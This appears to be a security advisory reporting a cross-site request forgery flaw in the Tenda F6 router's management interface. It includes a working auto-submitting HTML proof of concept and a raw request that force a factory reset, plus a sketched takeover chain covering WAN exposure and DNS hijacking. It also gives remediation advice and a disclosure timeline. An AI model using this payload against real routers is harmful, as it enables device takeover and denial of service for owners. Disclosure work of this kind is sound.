# Tenda F6 (N300) — Cross-Site Request Forgery in Web Management Interface

| | |
|---|---|
| **Vendor** | Tenda |
| **Product** | F6 (N300) Wireless Router |
| **Affected version** | Firmware V12.02.01.73 (Hardware V5.0) |
| **Latest version at disclosure** | V12.02.02.77 (not tested) |
| **Vulnerability type** | Cross-Site Request Forgery (CWE-352) |
| **Severity** | High — CVSS 3.1 Base 8.0 |
| **CVSS vector** | `AV:A/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` |
| **Status** | Reported to vendor 2026-10-09 — awaiting response |

## Summary

The web management interface of the Tenda F6 (N300) does not implement any
anti-CSRF protection. State-changing administrative actions are accepted as
simple form `POST` requests with no anti-CSRF token and no `SameSite`
restriction on the session cookie. An attacker who induces an authenticated
administrator to open a crafted web page can silently perform administrative
actions on the router, including restoring factory settings, rebooting the
device, and changing the administrator password — resulting in full device
takeover and denial of service.

Because the router uses the fixed default LAN address `192.168.0.1` across all
units, a single exploit page works against any affected device with no prior
knowledge of the target.

## Affected component

- Web management interface (default `http://192.168.0.1`)
- Endpoint example: `POST /goform/sysRestore` (factory restore)
- Other `/goform/` state-changing endpoints (e.g. password change, reboot)

## Proof of Concept

The following HTML, when opened by a user with an authenticated session to the
router, submits a factory-restore request with no further interaction:

```html
<!doctype html>
<html>
  <body>
    <form action="http://192.168.0.1/goform/sysRestore" method="POST">
      <input type="hidden" name="module1" value="sysOperate" />
      <input type="hidden" name="action" value="restore" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

The equivalent raw request:

```http
POST /goform/sysRestore HTTP/1.1
Host: 192.168.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

module1=sysOperate&action=restore
```

**Video demonstration:** [CSRFonTenda.mp4](https://github.com/0xWKZER/tenda-f6-vulnerabilities/blob/main/CSRFonTenda.mp4)

## Steps to reproduce

1. Log in to the router's web interface at `http://192.168.0.1`.
2. In the same browser, open the PoC HTML page above (hosted anywhere).
3. Observe that the request is accepted and the action (factory restore)
   executes without any CSRF token or confirmation.

## Impact (confirmed)

- **Full administrative takeover** — the password-change action can be forged,
  giving the attacker control of the router and locking out the owner.
- **Denial of service** — factory restore and reboot can be triggered on demand.
- **Wi-Fi credential disclosure** — with administrative access, the device
  configuration file can be downloaded, and it contains the Wi-Fi password (PSK)
  in recoverable form.
- **No authentication of intent** — the attack requires only that a logged-in
  user view a page; the predictable default IP makes it effective against any
  affected device.

## Potential attack chain (pending confirmation)

The following escalation is plausible based on the confirmed CSRF and the
device's post-reset behaviour. Each step is marked with its verification status:

1. **Forced factory reset — CONFIRMED.** A CSRF request to `/goform/sysRestore`
   restores the device to factory settings.
2. **Unauthenticated setup state — TO BE CONFIRMED.** After the reset, the
   device returns to an initial state with no administrator password, where the
   setup flow lets whoever reaches it first set new credentials.
3. **Attacker-controlled takeover — TO BE CONFIRMED.** If an attacker can reach
   the setup page before the legitimate owner, they can set the administrator
   password to a value of their choosing, obtaining full control and locking out
   the owner. (Feasibility depends on winning this race after the reset.)
4. **Post-takeover impact:**
   - **Wi-Fi credential disclosure — CONFIRMED** (via configuration file
     download, as above).
   - **Enable remote / WAN web management — TO BE CONFIRMED** — would expose the
     management interface to the internet.
   - **DNS modification — PENDING VENDOR CONFIRMATION** — if DNS settings are
     modifiable post-authentication, an attacker could redirect traffic for all
     clients behind the router to attacker-controlled resolvers.

**Status:** Step 1 and Wi-Fi credential disclosure are confirmed. Steps 2–3 and
the remaining post-takeover items are listed as a potential chain awaiting
independent and/or vendor confirmation.

## Impact escalation (conditional)

The base rating reflects a LAN-adjacent attacker (the victim must open the page
from within their own network). If the management interface is reachable from
the WAN — for example where remote management is enabled, or is enabled as part
of the attack — the attack vector changes from adjacent to network
(`AV:A` → `AV:N`), substantially increasing severity (CVSS ~9.x). This depends
on the device's deployment (a public WAN IP, not behind CGNAT).

## Remediation

- Implement anti-CSRF tokens on all state-changing requests.
- Set session cookies to `SameSite=Strict` (or `Lax`), `HttpOnly`, and `Secure`.
- Require re-authentication (current password) for sensitive actions such as
  password change and factory restore.
- Do not store or expose the Wi-Fi password in a downloadable configuration
  file in recoverable form.

## Disclosure timeline

| Date | Event |
|---|---|
| 2026-10-09 | Vulnerability discovered |
| 2026-10-09 | Reported to Tenda (productsecure@tenda.cn) |
| *pending* | Advisory published |

## Credits

Discovered by [0xWKZER](https://github.com/0xWKZER) and [Friend's Name].

## Disclaimer

This advisory is published for educational and defensive purposes. Testing was
performed only on devices owned by the researchers. Do not use this information
against systems you do not own or are not authorized to test.
